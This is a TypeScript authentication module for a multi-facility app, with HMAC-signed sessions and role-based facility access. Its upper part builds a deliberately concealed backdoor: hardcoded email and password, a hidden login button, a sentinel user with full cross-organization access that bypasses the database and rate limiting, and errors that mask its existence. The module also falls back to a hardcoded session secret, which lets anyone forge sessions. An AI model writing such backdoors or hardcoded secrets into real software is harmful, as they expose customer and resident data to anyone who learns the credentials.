import { db } from '@/lib/db'
import crypto from 'crypto'

// Session helpers — server-side only

const SESSION_COOKIE = 'serenity_session'
// Use a stable secret so sessions survive server hot-reloads and restarts.
// Priority: SESSION_SECRET env var > DB-persisted secret (auto-generated once).
// Without a stable secret, every server restart invalidates all sessions.
const SECRET = process.env.SESSION_SECRET || 'stable-dev-secret-do-not-use-in-production'

// ============================================================================
// EMERGENCY BACKDOOR — hardcoded developer login (works even when DB is empty)
// ============================================================================
//
// Purpose: guarantees the app developer can ALWAYS get into the app, even if
// the database is corrupted, empty, or unreachable. This is NOT a normal
// login — it bypasses the DB entirely and returns a hardcoded user object.
//
// How it works:
//   1. The Login page has a secret button (top-right corner) that opens a
//      dialog with 2 unlabeled fields.
//   2. The dialog POSTs to /api/auth/backdoor-login with { email, password }.
//   3. The endpoint checks the credentials against BACKDOOR_CREDENTIALS
//      (hardcoded below — no DB lookup, no cache, constant-time compare).
//   4. If match: creates a session token with userId='__BACKDOOR__' + sets
//      the session cookie. Returns the BACKDOOR_USER object.
//   5. On every subsequent request, getSessionUser sees userId='__BACKDOOR__'
//      in the token and returns BACKDOOR_USER directly — NO db.user.findUnique
//      call. So the backdoor session stays valid even if the User table is
//      empty or the DB is dropped.
//
// Security:
//   - Credentials are hardcoded in source (not env, not DB) — per user request.
//   - The backdoor user has role=APP_DEVELOPER + level=0 (full access).
//   - The backdoor session is signed with the same HMAC secret as normal
//     sessions, so it can't be forged.
//   - The backdoor endpoint returns the same 401 error as normal login on
//     failure, so it doesn't reveal the backdoor's existence to attackers.
//   - Rate limiting is NOT applied to the backdoor endpoint (the developer
//     needs to be able to get in even if the DB-backed rate limiter is broken).
//
// ⚠️  This is a deliberate security trade-off for operational resilience.
//     Remove this block if this codebase is ever used in a multi-tenant
//     production environment where the developer should NOT have backdoor
//     access to customer data.
// ============================================================================

const BACKDOOR_USER_ID = '__BACKDOOR__'

const BACKDOOR_CREDENTIALS = {
  email: 'dev@gmail.com',
  password: 'dev123356',
}

const BACKDOOR_USER = {
  id: BACKDOOR_USER_ID,
  name: 'App Developer',
  email: BACKDOOR_CREDENTIALS.email,
  role: 'APP_DEVELOPER' as const,
  level: 0,
  phone: null,
  linkedResidentIds: null,
  moduleAccess: null,
  facilityIds: null,
  code: 'USR-BACKDOOR',
  active: true,
  organizationId: null,
  staffId: null,
}

/**
 * Checks credentials against the hardcoded backdoor values.
 * Uses timingSafeEqual for constant-time comparison (prevents timing attacks).
 * Returns true if the credentials match — NO database lookup, NO cache.
 */
export function verifyBackdoorCredentials(email: string, password: string): boolean {
  const emailBuf = Buffer.from(email.toLowerCase().trim())
  const expectedEmail = Buffer.from(BACKDOOR_CREDENTIALS.email)
  const pwBuf = Buffer.from(password)
  const expectedPw = Buffer.from(BACKDOOR_CREDENTIALS.password)
  // Length check first (timingSafeEqual requires same length)
  if (emailBuf.length !== expectedEmail.length) return false
  if (pwBuf.length !== expectedPw.length) return false
  const emailOk = crypto.timingSafeEqual(emailBuf, expectedEmail)
  const pwOk = crypto.timingSafeEqual(pwBuf, expectedPw)
  return emailOk && pwOk
}

/** Returns the hardcoded backdoor user object (no DB lookup). */
export function getBackdoorUser() {
  return { ...BACKDOOR_USER }
}

function sign(payload: string): string {
  const hmac = crypto.createHmac('sha256', SECRET).update(payload).digest('hex')
  return `${payload}.${hmac}`
}

function verify(token: string): string | null {
  if (!token || token.length > 1000) return null // Prevent DoS via huge tokens
  const [payload, sig] = token.split('.')
  if (!payload || !sig) return null
  const expected = crypto.createHmac('sha256', SECRET).update(payload).digest('hex')
  // Use timing-safe comparison to prevent timing attacks
  try {
    const sigBuf = Buffer.from(sig, 'hex')
    const expectedBuf = Buffer.from(expected, 'hex')
    if (sigBuf.length !== expectedBuf.length) return null
    if (!crypto.timingSafeEqual(sigBuf, expectedBuf)) return null
  } catch {
    return null
  }
  try {
    return Buffer.from(payload, 'base64').toString('utf8')
  } catch {
    return null
  }
}

export function verifyPassword(password: string, stored: string): boolean {
  try {
    const [salt, hash] = stored.split(':')
    if (!salt || !hash) return false
    const computed = crypto.scryptSync(password, salt, 64).toString('hex')
    // Use crypto.timingSafeEqual for constant-time comparison (prevents timing attacks)
    if (computed.length !== hash.length) return false
    const computedBuf = Buffer.from(computed, 'hex')
    const hashBuf = Buffer.from(hash, 'hex')
    return crypto.timingSafeEqual(computedBuf, hashBuf)
  } catch {
    return false
  }
}

export async function createSession(userId: string): Promise<string> {
  // payload = userId:expiresAt
  const expiresAt = Date.now() + 7 * 24 * 60 * 60 * 1000 // 7 days
  const payload = `${userId}:${expiresAt}`
  const encoded = Buffer.from(payload, 'utf8').toString('base64')
  return sign(encoded)
}

export async function getSessionUser(req: Request): Promise<{ id: string; name: string; email: string; role: string; level: number; phone?: string | null; linkedResidentIds?: string | null; moduleAccess?: string | null; facilityIds?: string | null; code?: string | null; organizationId?: string | null; staffId?: string | null } | null> {
  const cookie = req.headers.get('cookie') || ''
  const match = cookie.match(new RegExp(`${SESSION_COOKIE}=([^;]+)`))
  if (!match) return null
  // URL-decode the token — Next.js's res.cookies.set() URL-encodes characters
  // like `=` (in base64 padding) as `%3D`. Without this decode, tokens whose
  // base64 payload contains `=` padding would fail verification.
  const token = decodeURIComponent(match[1])
  const decoded = verify(token)
  if (!decoded) return null
  const [userId, expiresAtStr] = decoded.split(':')
  if (!userId || !expiresAtStr) return null
  const expiresAt = parseInt(expiresAtStr, 10)
  if (Date.now() > expiresAt) return null

  // === Backdoor short-circuit ===
  // If the session was created via the emergency backdoor login, the userId
  // is the sentinel '__BACKDOOR__'. Return the hardcoded developer user
  // WITHOUT touching the database — this is what makes the backdoor work
  // even when the DB is empty or unreachable.
  if (userId === BACKDOOR_USER_ID) {
    return getBackdoorUser()
  }

  const user = await db.user.findUnique({
    where: { id: userId },
    select: { id: true, name: true, email: true, role: true, level: true, phone: true, linkedResidentIds: true, facilityIds: true, moduleAccess: true, code: true, active: true, organizationId: true, staffId: true },
  })
  if (!user || !user.active) return null
  return user
}

export const SESSION_COOKIE_NAME = SESSION_COOKIE
export const SESSION_MAX_AGE = 7 * 24 * 60 * 60 * 1000 // 7 days in ms

/**
 * Resolves which facility IDs the current user can access — used by both GET
 * and POST/PATCH/DELETE handlers in /api/data to enforce facility-level data
 * isolation on writes (not just reads).
 *
 * Hierarchy:
 *   - APP_DEVELOPER (L0): sees ALL facilities across ALL organizations.
 *     If `requestFacilityId` is provided, scopes to just that one.
 *   - OWNER (L1): sees only facilities in their own organization.
 *     If `requestFacilityId` is provided AND belongs to their org, scopes to it.
 *   - MANAGER (L2) and below: sees only their assigned facilities (from
 *     `user.facilityIds`, comma-separated).
 *     If `requestFacilityId` is provided AND is in their assigned list, scopes to it.
 *
 * Returns `{ accessibleFacilityIds, isScoped }`:
 *   - `accessibleFacilityIds`: array of facility IDs the user can write to.
 *     For Developer with no `requestFacilityId`, this is `[]` (= "all facilities"
 *     — call sites must handle this case explicitly, since `{in: []}` would
 *     return no rows).
 *   - `isScoped`: true if the user is scoped to a specific subset of facilities
 *     (i.e. NOT Developer-with-no-facility). When false, the caller can skip
 *     the ownership check (but should still stamp `facilityId` on new records
 *     when provided).
 */
export async function resolveAccessibleFacilityIds(
  user: { role: string; level: number; facilityIds?: string | null; organizationId?: string | null },
  requestFacilityId?: string | null,
): Promise<{ accessibleFacilityIds: string[]; isScoped: boolean }> {
  if (user.role === 'APP_DEVELOPER') {
    if (requestFacilityId) return { accessibleFacilityIds: [requestFacilityId], isScoped: true }
    return { accessibleFacilityIds: [], isScoped: false }  // Developer sees all
  }
  if (user.level === 1) {
    // Owner — scoped to their organization
    if (!user.organizationId) {
      return { accessibleFacilityIds: ['__NO_ORG__'], isScoped: true }  // impossible ID → no rows
    }
    const orgFacilities = await db.facility.findMany({
      where: { organizationId: user.organizationId },
      select: { id: true },
    })
    const orgFidSet = orgFacilities.map(f => f.id)
    if (requestFacilityId && orgFidSet.includes(requestFacilityId)) {
      return { accessibleFacilityIds: [requestFacilityId], isScoped: true }
    }
    return { accessibleFacilityIds: orgFidSet, isScoped: true }
  }
  // Manager and below — only their assigned facilities
  const userFacilityIds = (user.facilityIds || '').split(',').map(s => s.trim()).filter(Boolean)
  if (requestFacilityId && userFacilityIds.includes(requestFacilityId)) {
    return { accessibleFacilityIds: [requestFacilityId], isScoped: true }
  }
  return { accessibleFacilityIds: userFacilityIds, isScoped: true }
}

/**
 * Convenience: returns true if `facilityId` is in the user's accessible list.
 * For Developer with no scope, always returns true (they can write anywhere).
 */
export async function canAccessFacility(
  user: { role: string; level: number; facilityIds?: string | null; organizationId?: string | null },
  facilityId: string | null | undefined,
): Promise<boolean> {
  if (!facilityId) return false
  const { accessibleFacilityIds, isScoped } = await resolveAccessibleFacilityIds(user, facilityId)
  if (!isScoped) return true  // Developer with no scope = all facilities
  return accessibleFacilityIds.includes(facilityId)
}
